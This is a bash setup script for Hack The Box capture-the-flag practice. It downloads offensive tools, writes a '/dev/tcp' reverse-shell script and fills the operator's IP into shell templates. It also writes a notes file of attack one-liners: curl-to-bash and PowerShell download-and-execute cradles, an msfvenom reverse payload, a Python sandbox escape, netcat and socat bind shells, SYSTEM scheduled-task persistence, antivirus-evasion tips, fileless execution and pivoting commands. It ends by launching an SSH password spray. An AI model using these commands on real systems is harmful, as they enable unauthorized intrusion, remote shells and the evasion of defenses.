#!/bin/bash
# to run type '. /directory/setup'
# set box name, IP and ostype
#for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done

# Enforce sourced (we must be sourced so we can change caller's HOME)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  echo "ERROR: This script must be sourced, not executed."
  echo "Usage (must be sourced):  . ${BASH_SOURCE[0]} <boxname> [OS:win|linux] <target_ip>"
  exit 2
fi

# Argument handling: accept 2 or 3 args
if [ $# -lt 2 ] || [ $# -gt 3 ]; then
  echo "Usage: . ${BASH_SOURCE[0]} <boxname> [OS:win|linux] <target_ip>"
  return 1
fi

# Parse args:
BOXNAME="$1"
if [ $# -eq 2 ]; then
  OS="linux"
  IP="$2"
else
  OS="${2:-linux}"
  IP="$3"
fi

USER="$(whoami)"

# Save original HOME so the caller can restore if desired
if [ -z "${OLD_HOME+x}" ]; then
  OLD_HOME="${HOME}"
  export OLD_HOME
fi

# Set HOME to box-specific home
HOME="/home/${USER}/hackthebox/${BOXNAME}"
export HOME

restore_home() {
  if [ -n "${OLD_HOME+x}" ]; then
    HOME="${OLD_HOME}"
    export HOME
    unset OLD_HOME
    unset BOXNAME
    unset IP
    unset SELF
    unset HTB_TOKEN
    echo "HOME restored to ${HOME}"
  else
    echo "OLD_HOME not set — nothing to restore."
  fi
}

# get Self IP
get_self_ip() {
  local ip
  ip="$(hostname -I 2>/dev/null|grep -o '10.10.*'|awk '{print $1}')"
  if [ -z "$ip" ]; then
    ip="$(ip -4 addr show scope global 2>/dev/null|awk '/inet /{print $2}'| cut -d/ -f1|grep -o '10.10.*')" || SELF="$(ifconfig|grep 'inet 10.10.*'|awk '{print $2}')"
  fi
  SELF="${ip:-}"
  export SELF
}
get_self_ip


get_htb_token() {
  # Read HTB token if readable
  # set Token file location (for quick acess to htb api to submit flags)
  # create function to make submitting flags easy also
  TOKEN_FILE="/opt/Scripts/.HTB_TOKEN"
  if [ -r "$TOKEN_FILE" ]; then
    HTB_TOKEN="$(< "$TOKEN_FILE")"
  else
    HTB_TOKEN=""
    # only warn once (avoid noisy messages on repeated sourcing)
    if [ -z "${__HTB_TOKEN_WARNED+x}" ]; then
      echo "Warning: token file '$TOKEN_FILE' not found or not readable — HTB_TOKEN left empty."
      __HTB_TOKEN_WARNED=1
    fi
  fi
  export HTB_TOKEN
}
get_htb_token

export IP
export BOXNAME
# All Exports complete here ready for setup of environment

# setup workspace
setup_workspace() {
  [ -n "$HOME" ] || { echo "create_workspace: HOME not set"; return 1; }

  local dirs=(nmap www "$BOXNAME")
  local d
  for d in "${dirs[@]}"; do
    mkdir -p -- "$HOME/$d" || { echo "Failed to create $HOME/$d"; return 1; }
  done

  [ -f "$HOME/.hushlogin" ] || touch -- "$HOME/.hushlogin"

  # copy windows specific scripts to windows box or linux specific to linux box
  cd || exit
  [ -d "$HOME/Scripts" ] || git clone https://github.com/BeauJBurroughs/Scripts.git -q 
  cp Scripts/auto_stabilize_shell.sh "$HOME/"
  cp Scripts/.bashrc "$HOME/"
  cp Scripts/.bash_aliases "$HOME/"
  cp Scripts/.tmux.conf "$HOME/"
  cp Scripts/.zshrc "$HOME/"
  cp Scripts/shell.c "$HOME/www"
  cp Scripts/RemotePE.exe "$HOME/www"

  if [[ "$OS" == 'win' ]]; then
    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o "$HOME/www/winPEAS.bat"
    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o "$HOME/www/winPEASx64.exe"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe -o "$HOME/www/winPEASx64_ofs.exe"
    
    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o "$HOME/www/winPEASany.exe"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o "$HOME/www/winPEASany_ofs.exe"
    
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe -o "$HOME/www/winPEASx86.exe"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86_ofs.exe -o "$HOME/www/winPEASx86_ofs.exe"

    curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/latest/download/ConPtyShell.zip -o "$HOME/www/ConPtyShell.zip"
    unzip -qq $HOME/www/ConPtyShell.zip -d "$HOME/www/"
    rm "$HOME/www/"{ConPtyShell.zip,ConPtyShell_dotnet2.exe}
    curl -s -L https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip -o $HOME/www/RunasCs.zip
    unzip -qq $HOME/www/RunasCs.zip -d "$HOME/www/"
    rm "$HOME/www/"{RunasCs_net2.exe,RunasCs.zip}
    curl -s -L https://github.com/Friends-Security/SharpExclusionFinder/releases/latest/download/SharpExclusionFinder.exe -o "$HOME/www/SharpExclusionFinder.exe"
    
    # cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
    cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"

    curl -s -L https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1 -o "$HOME/www/Invoke-ConPtyShell.ps1"
    curl -s -L https://gist.githubusercontent.com/BeauJBurroughs/319d4e67e421b909aa139402e2075c58/raw/56f4d8a5383b4aa2661b7eab30aaef5c1d3cd8ac/ConPtyShell.cs -o "$HOME/www/ConPtyShell.cs"

    cp Scripts/sslshell.ps1 "$HOME/www"
    cp Scripts/put_server1.py "$HOME/www"
    cp Scripts/put_server2.py "$HOME/www"

  else # linux specific setup
    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
    curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh -o "$HOME/www/linpeas_fat.sh"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh -o "$HOME/www/linpeas_small.sh"
    
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_386 -o "$HOME/www/linpeas_linux_386"
    
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm64 -o "$HOME/www/linpeas_linux_arm64"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_arm -o "$HOME/www/linpeas_linux_arm"
    
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_amd64 -o "$HOME/www/linpeas_darwin_amd64"
    # curl -s -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_arm64 -o "$HOME/www/linpeas_darwin_arm64"
    
    curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s -o "$HOME/www/pspy64s"
    curl -s -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o "$HOME/www/pspy64"
    cp Scripts/root.c "$HOME/www"
  fi
  rm -rf Scripts/
  chmod 0644 "$HOME/notes" "$HOME/.hushlogin" >/dev/null 2>&1 || true
  return 0
}
setup_workspace

modify_shells() {
  # create the shell script (overwrite existing) and make executable
  printf '%s\n' '#!/bin/bash' "bash -i >& /dev/tcp/$SELF/9001 0>&1" > "$HOME/www/shell.sh"
  chmod +x "$HOME/www/shell.sh"

  if [[ -f "$HOME/www/Invoke-ConPtyShell.ps1" ]]; then 
    echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1"
  fi

  # helper to run sed only if file exists
  _sed_if_exists() {
    local file="$1"
    local expr="$2"
    if [ -f "$file" ]; then
      sed -i "$expr" "$file"
    else
      echo "Warning: $file not found; skipping."
    fi
  }

  # Replace placeholders in shell.c
  _sed_if_exists "$HOME/www/shell.c" "s|REPLACE_THIS_COMMAND|curl http://$SELF/code.bin|g"
  _sed_if_exists "$HOME/www/shell.c" "s|REPLACE_THIS_IP|$SELF|g"
  _sed_if_exists "$HOME/www/shell.c" "s|REPLACE_THIS_PORT|9001|g"

  # Replace placeholders in sslshell.ps1
  _sed_if_exists "$HOME/www/sslshell.ps1" "s|REPLACE_THIS_IP|$SELF|g"
  _sed_if_exists "$HOME/www/sslshell.ps1" "s|REPLACE_THIS_PORT|9001|g"

  # Replace placeholder in root.c
  _sed_if_exists "$HOME/www/root.c" "s|REPLACE_THIS_IP|$SELF|g"
  
  # Replace placeholder in ConPtyShell.cs
  _sed_if_exists "$HOME/www/ConPtyShell.cs" "s|REPLACE_THIS_IP|$SELF|g"
  _sed_if_exists "$HOME/www/ConPtyShell.cs" "s|REPLACE_THIS_PORT|9001|g"
  # to compile on linux use mcs:
  # mcs -sdk:4.7.1 -target:exe -optimize+ -out:ConPtyShell.exe ConPtyShell.cs
  # or dotnet:
  # dotnet new console -n ConPtyShell; cd ConPtyShell; mv ../ConPtyShell.cs Program.cs; 
  # dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true
  # mv bin/Release/net8.0/win-x64/publish/ConPtyShell.exe $HOME/www/ConPtyShell2.exe 

  # Replace placeholder in put_server1.py
  _sed_if_exists "$HOME/www/put_server1.py" "s|REPLACE_THIS_IP|$SELF|g"
  # Replace placeholder in put_server2.py
  _sed_if_exists "$HOME/www/put_server2.py" "s|REPLACE_THIS_IP|$SELF|g"


  echo "modify_shells: done (created $HOME/www/shell.sh and updated available templates)" 
}
modify_shells

# Build notes
build_notes() {
  if [[ ! -f "$HOME/notes" ]]; then
  cat << 'EOF' > "$HOME/notes"
# Standard enumration
export IP='$IP' > $HOME/notes
masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0
nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log
gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log
gobuster dns domain.com -o buster/dom.log

# curl
don't do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do:
curl http://$IP/cmd.php --data-urlencode 'cmd=curl http://$SELF/shell.sh|bash'
svn export https://github.com/repo.git/trunk/<folder to download>
echo -n '+'|jq -Rr @uri
curl() { { printf "GET /${3} HTTP/1.1\r\nHost: $1\r\nConnection: close\r\n\r\n" >&3; cat <&3; } 3<>/dev/tcp/$1/${2:-80}; }

# Python3 Sandbox Bypasses
getattr(getattr(globals()['__snitliub__'[::-1]], '__tropmi__'[::-1])('so'[::-1]),'metsys'[::-1])('ls')
[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == 'p' + 'op' + 'en'][0](['curl','http://$IP/shell.sh','|','bash'])

# tmux
if wanting to use another environmemnt in tmux and have multiple servers running
first start a new socket then call the socket with -S and attache to the socket
tmux -L Boxname
tmux -S /tmp/tmux-1000/Boxname ls
tmux -S /tmp/tmux-1000/Boxname a -t 0
tmux show-environment [-g] [-t target-session] || tmux set-environment [-gru] [-t target-session] name [value]
tmux show-environment -t 0 || tmux set-environment -t 0 IP 127.0.0.1 || and have to start new windows

# nikto
nikto -h $IP
add machine name domain.htb to /etc/hosts (search to ensure named correct)
nikto -h domain.htb

# To fix copy and paste problems in Virtual box
# when in virtual Machine
any problems kill VBoxClient clipboard etc.

# Windows Shells
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"
IWR http://10.10.10.10/shell.exe -OutFile shell.exe
klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88

# usefull windows tricks
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe
Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName
Expand-Archive xyz.zip
Start-Job -FilePath C:\Scripts\Sample.ps1
Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob
Invoke-Command -scriptblock { script }  -asJob -computername localhost
Start-Job -scriptblock { script }
Start-Process powershell {script}
Get-Process <name>
Stop-Process <pid>

# Scheduled Tasks
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Path\To\YourScript.ps1"
### Daily at 9 AM
$trigger = New-ScheduledTaskTrigger -Daily -At "9:00 AM"
### Weekly on Monday and Wednesday at 10 PM
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday, Wednesday -At "10:00 PM"
### Every minute
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 365)
### optional settings option
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
### Registering with System account
Register-ScheduledTask -TaskName "sslshell" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM"

# fix encoding problems
iconv -f utf-16le -t utf-8 lin.log -o lin2.log
gc rev.bat|set-content rev2.bat -encoding ascii
dos2unix file && vim --clean file

# Create and read QRCodes
qrencode -o output.png -s 10 'mymessage'
zbarimg output.png

# Windows privesc checklist
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

# linux privesc checklist
https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist


# CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)
# For local

# For Local
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"
see basic powershell in hacktricks for more

# runascs
runascs.ps1 is great for executing as another user if all else fails..
Invoke-RunasCs -Username user1 -Password password1 -Command powershell.exe (or cmd.exe) -Remote 10.10.14.129:9001

# really cool way to pivot/scan with nc
mkfifo reply
nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply
(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)
(dont forget to rm reply)
Then can just scan port 6379 through 65535 etc.
to scan ports with busybox/nc nc -z -v -w 1 192.168.0.1 80

# More ways to pivot
9510 and other ports through chisel
# On Kali
kali@kali:~$ ./chisel server -p 9002 --reverse
# On Windows
./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512
# if using metasploit
portfwd add -l 9510 -p 9510 -r 10.10.11.115
# Ligolo-ng
# On Kali
sudo /opt/ligolo-ng/proxy -selfcert
session
autoroute
iflist
ifdel --name <nameoftunnel>
# On Windows
ligolo-ng_agent_0.7.5_windows.exe -connect 10.10.14.149:11601 -ignore-cert

# Relay Binaries
socat TCP4-LISTEN:4444,fork EXEC:/bin/bash
socat tcp-listen:7777,reuseaddr,fork exec:cat,nofork
socat tcp-l:9999,reuseaddr,fork EXEC:./leak
socat -U TCP-LISTEN:5403,fork EXEC:'/usr/bin/data',stderr,pty,echo=0
socat tcp-l:5000,reuseaddr,fork EXEC:"./vuln",pty,stderr
ncat -l 1234 -c '/usr/bin/data' --keep-open
nc -lvnp 9999 -e '/usr/local/bin'

## create named pipe
rm -f /tmp/f; mkfifo /tmp/f

## launch interactive 'sh' session redirected to/from listening nc
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f
from another terminal connect

# Static Binaries
https://github.com/andrew-d/static-binaries
https://github.com/polaco1782/linux-static-binaries

# Windows Sharp Binaries
check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries

# Run Obsidian
/opt/obsidian/Obsidian-0.15.9.AppImage &>/dev/null &

# Anti Virus Evasion
## Nishang
for nishang antivirus evasion, just replace the Invoke-PowershellTcp with anything
and replace sendback with anything, and it should replace sendback and sendback2
and for the oneliner, split it to individual lines after every semicolon (;) , or just at after the {0};
## Conptyshell
for conpty shell replace the name invoke-conptyshell and conptyshell and remove the how to use section

# [defender exclusions](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/)
Get-MPPreference | select-object ExclusionPath
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion\Path*" } | Select-Object Message | FL
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\folder_to_check\|*"
https://medium.com/@lsecqt/creating-fully-undetectable-payload-fud-with-c-46a734837d1c
https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/

# Fileless elf execution
curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al

# Docker commands
# enter docker image
sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app
# enter docker container
sudo docker exec -it container bash

# OverlayFS and GameOverlay
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/
https://github.com/briskets/CVE-2021-3493

# LFI and Directory Traversal
# ../../etc/passwd (dots and filenames)
directory traversal/intruder
  directory_traversal.txt:140
  dotdotpwn.txt:21144
File Inclusion/Intruders
  Traversal.txt:4521
# ../../{FILES} (:%s/{FILES}//g --> page=FUZZ1FUZZ2 -w deep_traversal.txt:FUZZ1 -w list2:FUZZ2)
directory traversal/intruder
  deep_traversal.txt:878
  traversals-8-deep-exotic-encodings.txt:887
# /etc/passwd (just files to search for not dots)
file inclusion/intruders
  BSD-files.txt:12
  LFI-FD-check.txt:38
  LFI-WindowsFileCheck.txt:69
  Linux-files.txt:61
  List_Of_File_To_Include_NullByteAdded.txt:318
  List_Of_File_To_Include.txt:911
  Mac-files.txt:7
  simple-check.txt:9
  Web-files.txt:13
  Windows-files.txt:212
# ../../ (just dots)
file inclusion/intruders
  dot-slash-PathTraversal_and_LFI_pairing.txt:885
# ../../ or ../../etc/passwd (both dots and just files and dots with files)
file inclusion/intruders
  JHADDIX_LFI.txt:879
EOF
  fi
}
build_notes

# Build obsidian files for note keeping
# Cover page
build_cover_page() { 
  if [[ ! -f "$HOME/$BOXNAME/000 - Cover.md" ]]; then
  cat << 'EOF' > "$HOME/$BOXNAME/000 - Cover.md"
<p align="center">
  <img  width=1024 src="" />
</p>

# Path of Exploitation
* Foothold:
* User:
* root:
EOF
  fi
}

# loot page
build_loot_page() {
  if [[ ! -f "$HOME/$BOXNAME/000 - Loot.md" ]]; then
  cat << 'EOF' > "$HOME/$BOXNAME/000 - Loot.md"
# Creds
| Username | Password | Description |
| --- | --- | -- |
| | | |
EOF
  fi
}

# Nmap page
build_nmap_page() {
  if [[ ! -f "$HOME/$BOXNAME/05 - Nmap.md" ]]; then
  cat << 'EOF' > "$HOME/$BOXNAME/05 - Nmap.md"
# Nmap
| Port | Service | Description |
| --- | --- | --- |
| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80 | http | |
| | | |

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
EOF
  fi
}

# setup logig to not overwrite and to only write if does not exist
# Web enumeration page
build_web_enumeration_page() {
  if [[ ! -f "$HOME/$BOXNAME/10 - Web Enumeration.md" ]]; then
    cat << 'EOF' > "$HOME/$BOXNAME/10 - Web Enumeration.md"
# Web Enumeration
EOF
  fi
}

build_obsidian_files() {
  build_cover_page
  build_loot_page
  build_nmap_page
  build_web_enumeration_page
}
build_obsidian_files


# setup my tmux environment
#                                                       ________________
# window 0                                              |  %1  |  %2   |
# split vertical                                        |______|_______|
#                                                       |  %1  |  %2   |
# then split vertical                                   |______|_______|
cd || exit
tmux new-session -d
# stay in window zero
tmux split-window -v -d
tmux send-keys C-l 'nmapfull' Enter
# split h and stay in first window
tmux split-window -h -d
# send keys to the new split window
tmux send-keys -t %2 C-l 'cd www/;clear' Enter
tmux send-keys -t %2 C-l 'sudo python3 -m http.server 80' Enter
tmux split-window -h -t %1 -d
tmux send-keys -t %1 C-l 'nmapudp' Enter
# window 1
tmux new-window -d
tmux send-keys -t @1 C-l "cd $BOXNAME;nano '10 - Web Enumeration.md'" Enter
# window 2
tmux new-window -d
tmux send-keys -t @2 C-l "feroxbuster -u http://$IP -w  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --thorough"
# window 3
tmux new-window -d
tmux send-keys -t @3 C-l "ffuf -u http://$IP -H "Host: FUZZ.$BOXNAME.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc all"
# window 4
tmux new-window -d
tmux send-keys -t @4 C-l "/home/$USER/BurpSuiteCommunity/BurpSuiteCommunity" Enter
# window 5
tmux new-window -d
# Create a Vertical split
tmux split-window -t 5 -v -d
# We now have a top and bottom
# spit horizontal
tmux split-window -h -t 5.0 -d
# we now have tl tr b
# split tl
tmux split-window -v -t 5.0 -d
#we now have tl tr bl b
# split tr
tmux split-window -v -t 5.2 -d
# resize panes
tmux resize-pane -t 5.4 -D 20
tmux resize-pane -t 5.0 -U 7
tmux resize-pane -t 5.2 -U 7

# The layout should now be:
# +-------+-------+
# |       |       |
# |  0.0  |  0.2  |
# |       |       |
# +-------+-------+
# |       |       |
# |  0.1  |  0.3  |
# |       |       |
# +-------+-------+
# |      0.4      |
# +---------------+
#
# Now, send commands to each pane.
# C-l is Ctrl+l, which clears the screen.
# C-m is Enter
tmux send-keys -t 5.0 C-l 'nc -klvnp 65535 >> userlist.txt' C-m
tmux send-keys -t 5.1 C-l 'nc localhost 65535' C-m
tmux send-keys -t 5.2 C-l 'nc -klvnp 65534 >> passlist.txt' C-m
tmux send-keys -t 5.3 C-l 'nc localhost 65534' C-m
tmux send-keys -t 5.4 C-l "/opt/nxc ssh $IP -u userlist.txt -p passlist.txt"

# Attach to the tmux session to view the panes.
tmux a -t 0


